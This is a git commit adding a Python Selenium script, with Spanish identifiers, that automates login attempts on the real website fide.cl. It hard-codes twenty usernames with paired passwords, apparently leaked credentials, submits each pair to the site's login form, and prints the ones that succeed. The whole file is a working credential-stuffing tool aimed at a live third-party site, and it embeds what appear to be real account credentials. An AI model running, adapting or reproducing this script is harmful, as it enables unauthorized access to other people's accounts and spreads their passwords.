043cd5be423423939ca4425b110c195fce6b5fd6
darkiox <mrdarkiox@gmail.com>
2022-04-20 10:40:37 -0400

    Agregar hito2

---
+++ hito2.py
@@ -0,0 +1,35 @@
+#Darío Marmie
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+import time
+user = ["rodrigo","efariasn","cveas","zserrano","fmaldonadoc","mmaumora","pertica","doralisa","pcancino","norbean","jmacke","sgallardoa","gcrino","prsimon","jtriguero","imunita","hugo","maroalni","lilian","aschmi"]
+passwords = ["martina","teresianovit","cmsa","conatia","349B","23j64U32","661","santamarta","VBSPCC","29NB54rh","8g535Q72","7437","gucrita","8611-8","hmsiae","9823","arayamarin","14al04MI","mafraroga","84t15Y91"]
+
+userexitoso = []
+passexitoso = []
+driver = webdriver.Chrome()
+
+driver.get("https://www.fide.cl/")
+ipass = 0
+for x in user:
+    driver.implicitly_wait(0.5)
+    botonlogin = driver.find_element(By.ID, "menu-item-5520")
+    botonlogin.click()
+    usuarioinput = driver.find_element(By.NAME, "xoo-el-username")
+    usuarioinput.send_keys(x)
+    passinput = driver.find_element(By.NAME, "xoo-el-password")
+    passinput.send_keys(passwords[ipass])
+    passinput.send_keys(Keys.ENTER)
+    time.sleep(2)
+    if "?login=success" in driver.current_url:
+        userexitoso.append(x)
+        passexitoso.append(passwords[ipass])
+    driver.get("https://www.fide.cl")
+    ipass=ipass+1
+iexito = 0
+for x in userexitoso:
+    print("Login exitoso con: ")
+    print (userexitoso[iexito] + " | " + passexitoso[iexito])
+    iexito = iexito+1
+driver.quit()
